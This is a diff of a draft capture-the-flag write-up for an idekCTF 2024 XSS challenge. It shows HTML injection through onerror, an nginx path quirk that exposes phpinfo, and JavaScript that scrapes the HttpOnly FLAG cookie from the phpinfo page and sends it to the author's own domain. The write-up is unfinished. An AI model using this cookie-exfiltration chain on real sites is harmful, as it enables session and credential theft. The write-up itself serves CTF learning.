@@ -10,11 +10,13 @@ tags: ["web", "idekctf"]
 
 Challenge files: <!-- todo -->
 
-For [idekCTF 2024](https://ctf.idek.team/), I'm back on the web train again. This time... Unbelievably stuck at a simple XSS challenge. Well, let's dive right into it!
+We participated in [idekCTF 2024](https://ctf.idek.team/), as extra preparation for [SekaiCTF 2024](https://ctf.sekai.team/), and wow, it is *one hell of a difficult* event. We struggled quite a lot - barely solving a misc challenge, one rev challenge and one web challenge - the one you're reading about now.
+
+At the end, I guess it wasn't *too* complex in any means, but I managed to solve this after a few hours of brainstorming, and I'm proud of it! Let's dive straight into the challenge!
 
 ## The challenge
 
-You are given a web page, which responds to any parameters with the key `name` with `Hello, <name>`. For example:
+You are given a website, which responds to any parameters with the key `name` with `Hello, <name>`. For example:
 
 ```http
 GET /?name=yes HTTP/1.1
@@ -69,7 +71,9 @@ Now then... What's next?
 
 ## Randomly fetching things
 
-With the `onerror` attribute now up and rolling, it's time I try fetching something, but clearly that wouldn't be easy. For any non-relative links, you need the *entire* URL, as in `http://some.domain/`. "But, we can't use the `/` in the parameter!", I hear you say. Well, somehow, someway, the *backwards* slash (`\`) counts as a valid separator in this case, so we can do `http:\\some.domain\` and it will fetch properly. Now that we have a method to fetch from the HTML injection, let's just try leaking the cookie naively. Once again, note that the cookie is set as `HttpOnly`, but it doesn't hurt to get a try right?
+With the `onerror` attribute now up and rolling, it's time I try fetching something, but clearly that wouldn't be easy. For any non-relative links, you need the *entire* URL, including the scheme, e.g. `http://some.domain/`.
+
+"But, we can't use the `/` in the parameter!", I hear you say. Well, somehow, someway, the *backwards* slash (`\`) counts as a valid separator in this case, so we can do `http:\\some.domain\` and it will fetch properly. Now that we have a method to fetch from the HTML injection, let's just try leaking the cookie naively. Once again, note that the cookie is set as `HttpOnly`, but it doesn't hurt to try right?
 
 Using [`cloudflared`](https://github.com/cloudflare/cloudflared), I booted up a quick tunnel to expose a Node.js server to the Internet. I will *attempt* to log any response headers to see what comes up.
 
@@ -77,18 +81,128 @@ Using [`cloudflared`](https://github.com/cloudflare/cloudflared), I booted up a 
 const http = require('http');
 
 const server = http.createServer((req, res) => {
-  console.log('request headers:', req.headers);
+    console.log('request headers:', req.headers);
 
-  res.statusCode = 200;
-  res.setHeader('Content-Type', 'text/plain');
-  res.end('hi');
+    res.statusCode = 200;
+    res.setHeader('Content-Type', 'text/plain');
+    res.end('hi');
 });
 
 const PORT = 3000;
 server.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}/`);
+    console.log(`Server running at http://localhost:${PORT}/`);
 });
 ```
+
+After injecting into the instance a test cookie by running `document.cookie="test=yes"`, then tagging it as `HttpOnly` in DevTools, I send a simple fetch request with `credentials: "include"`. This *should* send any credentials over...? The HTML in question, after being injected, would look like such:
+
+```html
+<img onerror="fetch('http:\\localhost:5000',{credentials:'include'})" src="">
+```
+
+Hmm... Nope, doesn't work. Even if it *did* work, it wouldn't work on the remote setup, as they aren't hosted on the same domain. It's time we turn to something else.
+
+## The magic of `phpinfo()`
+
+In the source code given to you, there's also another file alongside `index.php`, and that's `info.php`.
+
+```php
+<?php
+phpinfo();
+?>
+```
+
+A simple 3-liner, calling the function `phpinfo()`. So, what does this do? It prints out *all* the current state of PHP for the currently running server, in a very neat page that's easy to parse (this will be very important!).
+
+> `phpinfo()` is also a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. \
+> \- [Official PHP manual](https://www.php.net/manual/en/function.phpinfo.php)
+
+So... I can just access `info.php` from the link and get the flag right? Of course, it's not so simple, for two reasons. One, the flag itself only gets injected by the admin bot instance. Two, you *will* get a 403 if you try to access the site, even on a local setup, thanks to this `nginx` config:
+
+```nginx
+# unrelated sections omitted for brevity
+location = /info.php {
+    allow 127.0.0.1;
+    deny all;
+}
+```
+
+Seems like we're at a dead end here. But, let's take a deeper look at the config section following the above:
+
+```nginx
+location ~ \.php$ {
+    root           /usr/share/nginx/html;
+    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
+    include fastcgi_params;
+    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
+}
+```
+
+First, this sets the root to `/usr/share/nginx/html` - the same root as `index.php`. Second, the `location ~ \.php$` matches any requests to `*.php` that isn't **exactly** `info.php`. The file name gets captured and passed into the FastCGI parameter `SCRIPT_FILENAME` as `$fastcgi_script_name`, and then served.
+
+A little quirk about this configuration is requests to `/a.php/b.php` will actually be passed in as `$document_root/a.php`----- That's our way into the PHP info page!
+
+We can test this by going to `/info.php/index.php`, and would you look at that, that's the PHP info page in front of us! Looks like we know what to fetch to find the cookie now!
+
+On the same instance that I've injected the cookie `test=yes`, even after marking it as `HttpOnly`, you can still find it displayed in the info page under the entry `$_COOKIE['test']`. Let's try to get it displayed just through the query first. My method is by using this script:
+
+```js
+fetch("info.php\index.php", { credentials: "include" })
+    .then(request => request.text())
+    .then(data => document.body.innerHTML = data);
+```
+
+What this does is fetch the info page, then replacing the original page's body with the PHP page, so we can work with it. An inspection through the tables' HTML, we can see the content is laid out as such:
+
+```html
+<tr>
+    <td class="e">$_COOKIE['test']</td>
+    <td class="v">yes</td>
+</tr>
+```
+
+It's time for some HTML scraping!
+
+## HTML scraping, my beloved
+
+So, there are *hundreds* of entries like the above, with the only difference being the inner text. How do I fetch the specific thing I want? Here, let me show you.
+
+```js
+const element = Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['test']")[0];
+
+const value = element.parentElement.children[1].innerText;
+
+console.log(value);
+// yes
+```
+
+The code itself should be self-explanatory, but if you need an explanation:
+
+- I grab all elements with the class `e` - this is all the keys on the left side of the table - then filtering for the element that has the exact text I'm looking for, in this case `$_COOKIE['test']`.
+- I grab this element's parent element, which should be the `<tr>` in the example above.
+- Knowing that this element has exactly two children, I grab the second one (index `1`), and this should be the value of the key I'm looking for.
+
+## Putting all this together
+
+With all of this knowledge, our game plan is clear:
+
+- The admin bot *will* go to the challenge instance, and then set a flag.
+- The "visited" URL will be the challenge instance again, but with a script in the `name` parameter to access `info.php`
+- Fetch the cookie `FLAG` out and send it back to our server.
+
+Let's craft our script in "normal" JavaScript first.
+
+```js
+fetch("info.php\index.php", { credentials: "include" })
+    .then(response => response.text())
+    .then(data => {
+        const element = Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['FLAG']")[0];
+        const value = element.parentElement.children[1].innerText;
+        fetch("http:\\my.domain\" + value);
+    });
+```
+
+In the parameter, we have no access to spaces - so we can't really do anything related to variable assignment.
 
 ## todo
 - snoop source code
